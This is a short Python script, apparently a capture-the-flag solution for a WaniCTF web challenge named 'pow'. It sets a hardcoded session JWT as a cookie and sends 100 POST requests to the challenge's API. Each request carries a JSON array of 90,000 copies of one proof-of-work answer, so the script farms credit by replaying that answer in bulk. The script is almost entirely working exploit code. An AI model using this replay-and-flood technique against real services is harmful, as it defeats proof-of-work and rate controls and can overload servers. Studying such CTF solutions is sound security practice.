import requests

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiIzZTFiNDk3OS1kMzcwLTQ3NzktOWYzMy1jOTRlY2NjZTY4OTYifQ.O3G4IrzZr_nb9yps9LkQs0yg6fYo85A75USiO8VTrfM"

headers = {
    "Content-Type": "application/json",
    "Cookie": f"pow_session={jwt}"
}

for i in range(100):
    data_array = list()

    for i in range(90000):
        data_array.append("2862152")

    data = str(data_array).replace("'", '"')

    r = requests.post("https://web-pow-lz56g6.wanictf.org/api/pow", data=data, headers=headers)

    print(r.text)
